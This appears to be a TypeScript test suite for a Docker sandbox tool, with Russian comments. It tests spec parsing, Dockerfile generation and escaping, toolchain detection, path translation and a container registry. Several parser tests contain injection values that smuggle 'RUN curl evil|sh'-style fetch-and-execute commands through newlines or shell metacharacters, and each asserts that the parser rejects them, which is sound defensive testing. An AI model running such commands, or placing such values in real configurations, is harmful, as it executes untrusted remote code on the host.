/**
 * Песочница: разбор спеки, детерминизм генератора и адресация по `cwd`.
 *
 * Живой Docker сюда не завязан — на этом уровне проверяется то, что не зависит от демона:
 * спека читается строго, один и тот же вход всегда даёт один и тот же тег образа, а реестр
 * находит песочницу проекта по любому подкаталогу его `cwd`. Сборка/старт контейнера — уже
 * интеграционный сценарий, ему свой тест с явным пропуском без Docker.
 */

import { deepStrictEqual, ok, strictEqual, throws } from 'node:assert/strict';
import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, it } from 'node:test';

import { buildDockerfile, imageTag, projectSlug, specHash } from '../src/sandbox/dockerfile.ts';
import { hostMountSource, legacyCacheVolumeName, legacyContainerName } from '../src/sandbox/dockerSandbox.ts';
import {
  findSandboxForCwd,
  ensureSandboxFor,
  _resetSandboxRegistryForTests,
  _setSandboxForTests,
  _setStoppingForTests,
} from '../src/sandbox/registry.ts';
import { parseSandboxSpec, SandboxSpecError, loadSandboxSpec } from '../src/sandbox/spec.ts';
import { preflightBlockers } from '../src/sandbox/preflight.ts';
import { detectSandboxSpec } from '../src/sandbox/detect.ts';
import type { SandboxHandle, SandboxSpec } from '../src/sandbox/types.ts';

const CV_LIKE_SPEC: SandboxSpec = {
  base: 'debian:12-slim',
  toolchains: {
    jdk: { version: '21', dist: 'temurin' },
    node: { version: '22' },
  },
  docker: 'socket',
  probes: [
    { cmd: 'java -version', expect: '"21\\.' },
    { cmd: 'node -v', expect: '^v22\\.' },
  ],
};

describe('разбор .sdlc/sandbox.json', () => {
  it('валидная спека разбирается как есть', () => {
    const spec = parseSandboxSpec(JSON.stringify(CV_LIKE_SPEC), 'sandbox.json');
    deepStrictEqual(spec, CV_LIKE_SPEC);
  });

  it('не JSON — понятная ошибка, а не исключение парсера', () => {
    throws(() => parseSandboxSpec('{ не json', 'x'), SandboxSpecError);
  });

  it('нет base — отказ', () => {
    throws(() => parseSandboxSpec(JSON.stringify({ toolchains: {} }), 'x'), SandboxSpecError);
  });

  it('base с переводом строки — отказ, а не молчаливая инъекция в Dockerfile (раньше принималось: только "непустая строка")', () => {
    throws(
      () =>
        parseSandboxSpec(
          JSON.stringify({ base: 'debian:12-slim\nRUN curl evil.sh|sh', toolchains: {} }),
          'x',
        ),
      SandboxSpecError,
    );
  });

  it('base с пробелом — отказ', () => {
    throws(
      () => parseSandboxSpec(JSON.stringify({ base: 'debian 12-slim', toolchains: {} }), 'x'),
      SandboxSpecError,
    );
  });

  it('base — валидная ссылка на образ (реестр/репозиторий:тег) проходит', () => {
    const spec = parseSandboxSpec(
      JSON.stringify({ base: 'ghcr.io/org/image:1.2.3', toolchains: {} }),
      'x',
    );
    strictEqual(spec.base, 'ghcr.io/org/image:1.2.3');
  });

  it('неизвестный тулчейн называется по имени', () => {
    throws(
      () =>
        parseSandboxSpec(
          JSON.stringify({ base: 'debian:12-slim', toolchains: { python: { version: '3.12' } } }),
          'x',
        ),
      (e: unknown) => e instanceof SandboxSpecError && /python/.test((e as Error).message),
    );
  });

  it('тулчейн без version — отказ', () => {
    throws(
      () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: { node: {} } }), 'x'),
      SandboxSpecError,
    );
  });

  it('версия с переводом строки — отказ, а не молчаливая подстановка в Dockerfile', () => {
    throws(
      () =>
        parseSandboxSpec(
          JSON.stringify({ base: 'x', toolchains: { jdk: { version: '21\nRUN curl evil|sh' } } }),
          'x',
        ),
      SandboxSpecError,
    );
  });

  it('версия не начинается с цифры — отказ', () => {
    throws(
      () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: { jdk: { version: 'latest' } } }), 'x'),
      SandboxSpecError,
    );
  });

  it('dist вне белого списка — отказ (раньше принимался и молча игнорировался)', () => {
    throws(
      () =>
        parseSandboxSpec(
          JSON.stringify({ base: 'x', toolchains: { jdk: { version: '21', dist: 'corretto' } } }),
          'x',
        ),
      (e: unknown) => e instanceof SandboxSpecError && /corretto/.test((e as Error).message),
    );
  });

  it('apt с shell-метасимволами — отказ', () => {
    throws(
      () =>
        parseSandboxSpec(
          JSON.stringify({ base: 'x', toolchains: {}, apt: ['git; curl evil|sh'] }),
          'x',
        ),
      SandboxSpecError,
    );
  });

  it('apt с обычным именем пакета — проходит', () => {
    const spec = parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, apt: ['make', 'g++'] }), 'x');
    deepStrictEqual(spec.apt, ['make', 'g++']);
  });

  it('env не объект — отказ', () => {
    throws(
      () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, env: 'oops' }), 'x'),
      SandboxSpecError,
    );
  });

  it('env массивом — отказ (раньше проходило: поля вовсе не было в валидации)', () => {
    throws(
      () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, env: ['a', 'b'] }), 'x'),
      SandboxSpecError,
    );
  });

  it('env-ключ не похож на имя переменной — отказ', () => {
    throws(
      () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, env: { 'not a var': 'x' } }), 'x'),
      SandboxSpecError,
    );
  });

  it('env-значение с переводом строки — отказ (инъекция Dockerfile-инструкций)', () => {
    throws(
      () =>
        parseSandboxSpec(
          JSON.stringify({ base: 'x', toolchains: {}, env: { X: 'a"\nRUN curl evil|sh\nENV Y="' } }),
          'x',
        ),
      SandboxSpecError,
    );
  });

  it('обычный env — проходит и доходит до спеки как есть', () => {
    const spec = parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, env: { MAVEN_OPTS: '-Xmx1g' } }), 'x');
    deepStrictEqual(spec.env, { MAVEN_OPTS: '-Xmx1g' });
  });

  it('нет файла — loadSandboxSpec отдаёт null, а не бросает', () => {
    const dir = mkdtempSync(join(tmpdir(), 'sdlc-sandbox-spec-'));
    try {
      strictEqual(loadSandboxSpec(dir), null);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('файл есть — читается и парсится', () => {
    const dir = mkdtempSync(join(tmpdir(), 'sdlc-sandbox-spec-'));
    try {
      const sdlcDir = join(dir, '.sdlc');
      mkdirSync(sdlcDir);
      writeFileSync(join(sdlcDir, 'sandbox.json'), JSON.stringify(CV_LIKE_SPEC));
      deepStrictEqual(loadSandboxSpec(dir), CV_LIKE_SPEC);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('генератор Dockerfile', () => {
  it('один и тот же спек — один и тот же хэш', () => {
    strictEqual(specHash(CV_LIKE_SPEC), specHash(CV_LIKE_SPEC));
  });

  it('другая версия тулчейна — другой хэш', () => {
    const other: SandboxSpec = { ...CV_LIKE_SPEC, toolchains: { ...CV_LIKE_SPEC.toolchains, jdk: { version: '17' } } };
    strictEqual(specHash(other) === specHash(CV_LIKE_SPEC), false);
  });

  it('тег образа детерминирован и безопасен для docker', () => {
    const tag = imageTag('CV / auth-104', CV_LIKE_SPEC);
    strictEqual(tag, imageTag('CV / auth-104', CV_LIKE_SPEC));
    strictEqual(/^sdlc-sandbox:[a-z0-9_.-]+$/.test(tag), true);
  });

  it('Dockerfile содержит слои обоих тулчейнов и держит контейнер живым', () => {
    const df = buildDockerfile(CV_LIKE_SPEC);
    strictEqual(df.includes('FROM debian:12-slim'), true);
    strictEqual(df.includes('eclipse-temurin:21-jdk'), true);
    strictEqual(df.includes('node:22-slim'), true);
    strictEqual(df.includes('docker:cli'), true); // docker: 'socket' тянет CLI для Testcontainers
    strictEqual(df.includes('sleep'), true);
  });

  it('без docker: socket — CLI-слой не добавляется', () => {
    const spec: SandboxSpec = { base: 'debian:12-slim', toolchains: { node: { version: '22' } } };
    strictEqual(buildDockerfile(spec).includes('docker:cli'), false);
  });

  // Регресс: Testcontainers внутри docker:socket-песочницы падал на несовместимости версий
  // API («client version 1.32 is too old») — сам docker CLI видел демон нормально, а
  // docker-java (используется Testcontainers) без явного DOCKER_API_VERSION слал устаревшую
  // версию по умолчанию. Подтверждено живым прогоном на CV.
  it('docker: socket — задаёт DOCKER_API_VERSION по умолчанию', () => {
    const spec: SandboxSpec = { base: 'debian:12-slim', toolchains: {}, docker: 'socket' };
    ok(/ENV DOCKER_API_VERSION=/.test(buildDockerfile(spec)));
  });

  it('docker: socket — spec.env переопределяет DOCKER_API_VERSION по умолчанию', () => {
    const spec: SandboxSpec = {
      base: 'debian:12-slim',
      toolchains: {},
      docker: 'socket',
      env: { DOCKER_API_VERSION: '1.45' },
    };
    const df = buildDockerfile(spec);
    const lines = df.split('\n').filter((l) => l.includes('DOCKER_API_VERSION'));
    // Обе строки ENV присутствуют (Dockerfile-семантика: последняя побеждает в рантайме),
    // но проектное значение должно идти ПОСЛЕ дефолта, чтобы реально победить.
    strictEqual(lines.length, 2);
    ok(lines[1]!.includes('1.45'), lines.join('\n'));
  });

  // Регресс: git отсутствовал и в базовом apt-списке, и в spec.apt проекта — Scope-гейты
  // методологии (git status/diff) молча падали на command not found внутри sandbox.
  it('git — в базовом apt-списке независимо от spec.apt проекта', () => {
    const withoutSpecApt: SandboxSpec = { base: 'debian:12-slim', toolchains: {} };
    const aptLine1 = buildDockerfile(withoutSpecApt).split('\n').find((l) => l.includes('apt-get install')) ?? '';
    ok(/\bgit\b/.test(aptLine1), aptLine1);

    const withSpecApt: SandboxSpec = { base: 'debian:12-slim', toolchains: {}, apt: ['jq'] };
    const aptLine2 = buildDockerfile(withSpecApt).split('\n').find((l) => l.includes('apt-get install')) ?? '';
    ok(/\bgit\b/.test(aptLine2), aptLine2);
    ok(/\bjq\b/.test(aptLine2), aptLine2);
  });

  it('env-значение с кавычкой экранируется, а не закрывает ENV раньше времени', () => {
    const spec: SandboxSpec = { base: 'debian:12-slim', toolchains: {}, env: { X: 'a"b\\c' } };
    const df = buildDockerfile(spec);
    strictEqual(df.includes('ENV X="a\\"b\\\\c"'), true, df);
  });

  it('env-значение с $ экранируется — Dockerfile не разворачивает его как переменную', () => {
    // Регресс: проверено реальной сборкой, что Dockerfile разворачивает ${VAR}/$VAR внутри
    // ENV "..." по значениям, объявленным раньше в этом же Dockerfile (JAVA_HOME/PATH) —
    // без экранирования env.X со значением "${JAVA_HOME}/evil" молча подставлял бы реальный
    // JAVA_HOME вместо буквальной строки из sandbox.json.
    const spec: SandboxSpec = { base: 'debian:12-slim', toolchains: {}, env: { X: '${JAVA_HOME}/evil' } };
    const df = buildDockerfile(spec);
    strictEqual(df.includes('ENV X="\\${JAVA_HOME}/evil"'), true, df);
    strictEqual(df.includes('ENV X="${JAVA_HOME}/evil"'), false, df);
  });

  it('два проекта, схлопывающихся в один safeName — разные теги образа (регресс на коллизию контейнера/тома)', () => {
    // "Foo Bar" и "foo-bar" оба дают safeName "foo-bar" — раньше это был один и тот же тег.
    const tagA = imageTag('Foo Bar', CV_LIKE_SPEC);
    const tagB = imageTag('foo-bar', CV_LIKE_SPEC);
    strictEqual(tagA === tagB, false, `${tagA} === ${tagB}`);
  });
});

function fakeHandle(hash: string): SandboxHandle {
  return {
    exec: {
      kind: 'docker',
      exec: async () => ({ exitCode: 0, stdout: '', stderr: '', durationMs: 0, timedOut: false }),
    },
    specHash: hash,
    runProbes: async () => [],
  };
}

describe('detectSandboxSpec: черновик спеки по составу репозитория', () => {
  function withFixture(files: Record<string, string>, fn: (root: string) => void): void {
    const root = mkdtempSync(join(tmpdir(), 'sdlc-detect-'));
    try {
      for (const [rel, content] of Object.entries(files)) {
        const full = join(root, rel);
        mkdirSync(join(full, '..'), { recursive: true });
        writeFileSync(full, content);
      }
      fn(root);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  }

  it('CV-подобный моно-репо: pom.xml даёт JDK, package.json/Dockerfile дают Node, Testcontainers включает docker', () => {
    withFixture(
      {
        'backend/pom.xml': '<project><properties><java.version>21</java.version></properties></project>',
        'frontend/package.json': JSON.stringify({ engines: { node: '>=22.0.0' } }),
        'frontend/Dockerfile': 'FROM node:22-alpine AS build\n',
        'backend/src/test/java/AuthFlowIntegrationTest.java': 'import org.testcontainers.junit.jupiter.Testcontainers;\n@Testcontainers\nclass X {}\n',
      },
      (root) => {
        const { spec, evidence } = detectSandboxSpec(root);
        deepStrictEqual(spec.toolchains, { jdk: { version: '21', dist: 'temurin' }, node: { version: '22' } });
        strictEqual(spec.docker, 'socket');
        strictEqual(spec.probes?.length, 3);
        strictEqual(evidence.some((e) => e.includes('pom.xml')), true);
        strictEqual(evidence.some((e) => e.includes('Testcontainers')), true);
      },
    );
  });

  it('нет манифестов вообще — пустая спека без тулчейнов и без docker', () => {
    withFixture({ 'README.md': '# ничего интересного\n' }, (root) => {
      const { spec, evidence } = detectSandboxSpec(root);
      deepStrictEqual(spec.toolchains, {});
      strictEqual(spec.docker, undefined);
      strictEqual(spec.probes, undefined);
      strictEqual(evidence.length, 0);
    });
  });

  it('maven.compiler.release читается, если java.version не задан', () => {
    withFixture(
      { 'pom.xml': '<project><properties><maven.compiler.release>17</maven.compiler.release></properties></project>' },
      (root) => {
        strictEqual(detectSandboxSpec(root).spec.toolchains.jdk?.version, '17');
      },
    );
  });

  it('JDK 8: проба ждёт "1.8. — дореформенную схему вывода java -version, не "8.', () => {
    // Регресс: проверено в Docker — `eclipse-temurin:8-jdk java -version` печатает
    // `openjdk version "1.8.0_502"`, не `"8...`. Проба без поправки ложно проваливалась
    // на верно установленной JDK 8.
    withFixture(
      { 'pom.xml': '<project><properties><java.version>8</java.version></properties></project>' },
      (root) => {
        const { spec } = detectSandboxSpec(root);
        strictEqual(spec.toolchains.jdk?.version, '8');
        const probe = spec.probes?.find((p) => p.cmd === 'java -version');
        ok(probe !== undefined);
        ok(new RegExp(probe.expect).test('openjdk version "1.8.0_502"'), probe.expect);
        ok(!new RegExp(probe.expect).test('openjdk version "18.0.1"'), probe.expect);
      },
    );
  });

  it('JDK 21: проба ждёт "21. напрямую — постреформенная схема (9+)', () => {
    withFixture(
      { 'pom.xml': '<project><properties><java.version>21</java.version></properties></project>' },
      (root) => {
        const { spec } = detectSandboxSpec(root);
        const probe = spec.probes?.find((p) => p.cmd === 'java -version');
        ok(probe !== undefined);
        ok(new RegExp(probe.expect).test('openjdk version "21.0.11"'), probe.expect);
        ok(!new RegExp(probe.expect).test('openjdk version "1.21.0"'), probe.expect);
      },
    );
  });

  it('BFS: манифест верхнего уровня находится, даже если СОСЕДНИЙ каталог верхнего уровня переполнен файлами', () => {
    // Регресс на DFS через стек: `pop()` берёт ПОСЛЕДНИЙ добавленный каталог первым, то
    // есть при алфавитном readdirSync() каталог, идущий позже по имени, разбирался бы
    // ПЕРВЫМ и мог сжечь весь бюджет MAX_FILES_SCANNED (4000) на свои файлы, не дав дойти
    // до pom.xml в каталоге, идущем раньше по имени. `aaa` (с манифестом) специально назван
    // раньше `zzz` (заведомо переполнен) по алфавиту — именно тот порядок, где старый DFS
    // проваливался, а BFS (очередь) — нет, потому что оба каталога верхнего уровня стоят
    // в очереди РЯДОМ и `aaa` обрабатывается первым независимо от того, что лежит в `zzz`.
    const files: Record<string, string> = {
      'aaa/pom.xml': '<project><properties><java.version>17</java.version></properties></project>',
    };
    for (let i = 0; i < 4_500; i++) files[`zzz/junk-${i}.txt`] = 'x';

    withFixture(files, (root) => {
      const { spec } = detectSandboxSpec(root);
      strictEqual(spec.toolchains.jdk?.version, '17');
    });
  });

  it('node_modules и target пропускаются — детект не тонет в чужих манифестах', () => {
    withFixture(
      {
        'frontend/node_modules/some-lib/package.json': JSON.stringify({ engines: { node: '>=99' } }),
        'backend/target/classes/pom.xml': '<project><properties><java.version>99</java.version></properties></project>',
      },
      (root) => {
        const { spec } = detectSandboxSpec(root);
        strictEqual(spec.toolchains.jdk, undefined);
        strictEqual(spec.toolchains.node, undefined);
      },
    );
  });

  it('нечитаемый манифест не роняет весь детект — best-effort, не всё-или-ничего', () => {
    withFixture(
      {
        'backend/pom.xml': '<project><properties><java.version>21</java.version></properties></project>',
        'frontend/package.json': JSON.stringify({ engines: { node: '>=22' } }),
      },
      (root) => {
        const unreadable = join(root, 'backend/pom.xml');
        chmodSync(unreadable, 0o000);
        try {
          const { spec } = detectSandboxSpec(root);
          // pom.xml нечитаем — JDK не находится, но это не топит остальной детект.
          strictEqual(spec.toolchains.jdk, undefined);
          strictEqual(spec.toolchains.node?.version, '22');
        } finally {
          chmodSync(unreadable, 0o644);
        }
      },
    );
  });
});

describe('preflightBlockers: не трогает Docker, если у проекта нет спеки', () => {
  it('проект без .sdlc/sandbox.json — пустой список блокеров, без похода в Docker', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'sdlc-preflight-'));
    try {
      // Нет `Docker` мок-объекта нарочно: если бы функция полезла собирать образ для
      // проекта без спеки, тест бы завис на реальном docker build, а не просто прошёл —
      // отсутствие похода в Docker и есть то, что здесь проверяется.
      deepStrictEqual(await preflightBlockers(dir, 'no-spec-project'), []);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('hostMountSource: перевод пути для docker-outside-of-docker', () => {
  afterEach(() => {
    delete process.env.SDLC_HOST_PROJECTS_DIR;
  });

  it('переменная не задана — путь не меняется (Runner на хосте, не в контейнере)', () => {
    strictEqual(hostMountSource('/projects/CV'), '/projects/CV');
  });

  it('переменная пустая строка — тоже не меняется', () => {
    process.env.SDLC_HOST_PROJECTS_DIR = '';
    strictEqual(hostMountSource('/projects/CV'), '/projects/CV');
  });

  it('переменная задана — префикс /projects меняется на хостовый корень', () => {
    process.env.SDLC_HOST_PROJECTS_DIR = '/Users/home/Code';
    strictEqual(hostMountSource('/projects/CV'), '/Users/home/Code/CV');
    strictEqual(hostMountSource('/projects/CV/backend'), '/Users/home/Code/CV/backend');
  });

  it('сам корень /projects тоже переводится', () => {
    process.env.SDLC_HOST_PROJECTS_DIR = '/Users/home/Code';
    strictEqual(hostMountSource('/projects'), '/Users/home/Code');
  });

  it('путь вне /projects не трогается — регресс на баг класса «префикс строки»', () => {
    // "/projects-other/x".startsWith("/projects") истинно как строковый префикс, хотя
    // "/projects-other" не лежит внутри "/projects" — та же ловушка, что и в реестре.
    process.env.SDLC_HOST_PROJECTS_DIR = '/Users/home/Code';
    strictEqual(hostMountSource('/projects-other/x'), '/projects-other/x');
  });
});

describe('миграция Docker-ресурсов на projectSlug', () => {
  it('legacyCacheVolumeName воспроизводит формулу до projectSlug дословно', () => {
    // Регресс-проверка не по абстрактной логике, а по РЕАЛЬНЫМ именам томов, найденным на
    // машине этой сессии `docker volume ls` до миграции: `sdlc-sandbox-cache-cv--root-.m2`
    // для проекта «cv», пути `~/.m2` — если формула здесь разойдётся со старым кодом,
    // миграция не найдёт настоящий том и молча создаст новый пустой.
    strictEqual(legacyCacheVolumeName('cv', '~/.m2'), 'sdlc-sandbox-cache-cv--root-.m2');
    strictEqual(legacyCacheVolumeName('cv', '~/.npm'), 'sdlc-sandbox-cache-cv--root-.npm');
  });

  it('legacyContainerName воспроизводит формулу до projectSlug — тот же hash, что и у новой', () => {
    strictEqual(legacyContainerName('cv', 'abc123'), 'sdlc-sandbox-cv-abc123');
  });

  it('legacy-имя тома отличается от нового имени по формуле projectSlug', () => {
    // `migrateLegacyCacheVolume` выходит no-op'ом, если `newName === legacyName` —
    // формулы обязаны различаться (новая содержит хэш от имени проекта, старая нет),
    // иначе миграция самой себе была бы тихо бесполезна.
    const newName = `sdlc-sandbox-cache-${projectSlug('cv')}-root-.m2`;
    strictEqual(newName === legacyCacheVolumeName('cv', '~/.m2'), false);
  });
});

describe('реестр песочниц: адресация по cwd', () => {
  afterEach(() => _resetSandboxRegistryForTests());

  it('пустой реестр — null для любого cwd (сегодняшнее поведение всех проектов)', () => {
    strictEqual(findSandboxForCwd('/any/path'), null);
  });

  it('cwd, совпадающий с корнем проекта, находит его песочницу', () => {
    _setSandboxForTests('/proj', fakeHandle('a'));
    strictEqual(findSandboxForCwd('/proj')?.specHash, 'a');
  });

  it('подкаталог проекта (backend/, frontend/) находит песочницу его корня', () => {
    _setSandboxForTests('/proj', fakeHandle('a'));
    strictEqual(findSandboxForCwd('/proj/backend')?.specHash, 'a');
    strictEqual(findSandboxForCwd('/proj/frontend/src')?.specHash, 'a');
  });

  it('несовпадающий путь не считается подкаталогом ("/proj-other" не под "/proj")', () => {
    // Регресс на баг класса «префикс строки, а не пути»: `/proj-other/x`.startsWith(`/proj`)
    // истинно, хотя `/proj-other` не лежит внутри `/proj`.
    _setSandboxForTests('/proj', fakeHandle('a'));
    strictEqual(findSandboxForCwd('/proj-other/x'), null);
  });

  it('из двух зарегистрированных корней выбирается более специфичный (вложенный)', () => {
    _setSandboxForTests('/proj', fakeHandle('outer'));
    _setSandboxForTests('/proj/backend', fakeHandle('inner'));
    strictEqual(findSandboxForCwd('/proj/backend/src')?.specHash, 'inner');
    strictEqual(findSandboxForCwd('/proj/frontend')?.specHash, 'outer');
  });

  it('ensureSandboxFor ждёт незавершённую остановку контейнера того же проекта, не гонится мимо неё', async () => {
    // Регресс на гонку: DELETE /api/runs/:id гасит песочницу fire-and-forget, а
    // `active.delete()` внутри `stopSandboxForProject` синхронный — без ожидания `stopping`
    // повторный старт того же проекта мог поднять новый контейнер, пока старый ещё в
    // процессе `docker rm -f` того же детерминированного имени (экспериментально
    // воспроизведено на реальном Docker: `docker run --name X` параллельно с `docker rm -f
    // X` падает конфликтом имени в большинстве попыток).
    const dir = mkdtempSync(join(tmpdir(), 'sdlc-stopping-race-'));
    try {
      let stoppingResolved = false;
      let resolveStop: () => void = () => {};
      const stoppingPromise = new Promise<void>((resolve) => {
        resolveStop = () => {
          stoppingResolved = true;
          resolve();
        };
      });
      _setStoppingForTests(dir, stoppingPromise);

      const ensurePromise = ensureSandboxFor(dir, 'race-project');
      let ensureResolved = false;
      void ensurePromise.then(() => {
        ensureResolved = true;
      });

      // Дать микрозадачам отработать — `ensureSandboxFor` не должен продвинуться дальше
      // ожидания `stopping`, пока та не резолвится.
      await new Promise((r) => setTimeout(r, 20));
      strictEqual(ensureResolved, false, 'ensureSandboxFor не подождал незавершённую остановку');

      resolveStop();
      const result = await ensurePromise;
      strictEqual(stoppingResolved, true);
      // В `dir` нет .sdlc/sandbox.json — после ожидания честно возвращает null, не
      // переиспользует ничего чужого.
      strictEqual(result, null);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
